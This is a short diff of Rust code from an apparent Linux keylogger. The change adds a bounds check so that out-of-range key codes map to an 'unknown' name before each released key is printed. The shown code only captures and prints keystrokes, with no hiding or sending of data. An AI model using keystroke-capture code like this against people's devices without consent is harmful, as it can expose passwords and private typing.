@@ -51,7 +51,13 @@ impl Common for Keylogger {
 
     fn log_keystroke(&self, ev: input_event) {
         if ev.type_ == EV_KEY && ev.value == 0 {
-            let key = KEY_NAMES[ev.code as usize];
+            let key: &str;
+
+            if ev.code < MAX_KEYS {
+                key = KEY_NAMES[ev.code as usize];
+            } else {
+                key = UK;
+            };
 
             println!("{}", key);
         }
